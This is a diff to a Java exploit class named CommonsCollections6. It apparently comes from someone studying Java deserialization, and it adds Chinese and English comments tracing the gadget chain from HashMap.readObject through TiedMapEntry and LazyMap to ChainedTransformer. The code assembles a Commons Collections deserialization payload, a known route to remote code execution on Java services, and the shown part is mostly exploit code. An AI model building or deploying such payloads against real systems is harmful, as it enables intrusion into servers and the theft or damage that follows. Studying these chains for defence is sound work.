@@ -13,6 +13,18 @@ import java.util.HashMap;
 import java.util.Map;
 
 public class CommonsCollections6 {
+
+    /**
+     * HashMap#readObject()  !!!因为jdk8u71之后AnnotationInvocationHandler不能用,cc1失效，所以这里换成了HashMap
+     * HashMap#hash(key)
+     *      TiedMapEntry#hashCode()
+     *      TiedMapEntry#getValue()
+     *          LazyMap.get(key)
+     *              ChainedTransformer.transform()
+     *
+     *
+     *
+     */
     public static void main(String[] args) throws Exception {
         Transformer[] fakeTransformers = new Transformer[] {new ConstantTransformer(1)};
         Transformer[] transformers = new Transformer[] {
@@ -30,10 +42,11 @@ public class CommonsCollections6 {
 
         // 不再使用原CommonsCollections6中的HashSet，直接使用HashMap
         Map innerMap = new HashMap();
+
         Map outerMap = LazyMap.decorate(innerMap, transformerChain);
-
+        // tiedMapEntry.hashCode --> tiedMapEntry.getValue --> LazyMap.get(key)
         TiedMapEntry tme = new TiedMapEntry(outerMap, "keykey");
-
+        // hashMap.readObject() --> hashMap.hash(key) --> tiedMapEntry.hashCode()
         Map expMap = new HashMap();
         expMap.put(tme, "valuevalue");
 
